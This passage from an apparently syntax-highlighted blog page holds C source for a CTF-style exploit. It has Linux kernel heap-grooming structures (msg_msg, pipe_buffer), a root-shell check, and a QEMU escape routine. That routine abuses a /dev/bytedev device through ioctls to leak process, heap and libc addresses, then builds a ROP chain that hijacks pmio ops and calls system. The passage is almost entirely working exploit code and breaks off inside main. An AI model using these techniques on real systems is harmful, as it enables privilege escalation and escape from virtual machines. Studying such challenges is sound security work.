class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    qemu_escape();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_escape</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span> *fake_ops = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak process base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x114514</span>, <span class="number">1</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-25</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x474039</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = elf_base + <span class="number">0x2e0250</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_read_addr = elf_base + <span class="number">0x474039</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] process base: \033[0m %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] system addr: \033[0m %p\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    read(fd, fake_ops, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak heap base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x186</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x2ae00</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> parent_object = heap_base + <span class="number">0x9f650</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> opaque_addr = heap_base + <span class="number">0x10adc20</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_ops_addr = opaque_addr + <span class="number">0xb68</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap base: \033[0m %p\n&quot;</span>, heap_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] parent_object addr: \033[0m %p\n&quot;</span>, parent_object);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] opaque addr: \033[0m %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak libc base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-388</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span> * <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x7</span> * <span class="number">8</span>) - <span class="number">0x4385f0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> mov_rsp_rbx = <span class="number">0x5b4d0</span> + libc_base;</span><br><span class="line">    <span class="comment">// mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    <span class="keyword">uint64_t</span> magic_gadget = <span class="number">0x0000000000151990</span> + libc_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] libc base: \033[0m %p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] magic gadget addr: \033[0m %p\n&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;nl flag\x00&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> command_addr = opaque_addr + <span class="number">0xf8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] prepare for hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810, -0x16d);</span></span><br><span class="line">    <span class="comment">// read(fd, buf, 0x200);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x18</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">8</span>) = opaque_addr + <span class="number">0x100</span> - <span class="number">0x20</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe0</span>) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe8</span>) = command_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf0</span>) = system_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf8</span>) = *(<span class="keyword">uint64_t</span> *)command;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = mov_rsp_rbx;</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x108</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x16d</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-6</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops) = pmio_read_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops + <span class="number">8</span>) = magic_gadget;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x30</span> + i * <span class="number">8</span>) = *(<span class="keyword">uint64_t</span> *)(fake_ops + i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] ready to hijack! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-347</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = opaque_addr + <span class="number">0xc28</span>;</span><br><span class="line">    write(fd, buf, <span class="number">0x50</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">0x196082</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810,);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] done! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_qid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> 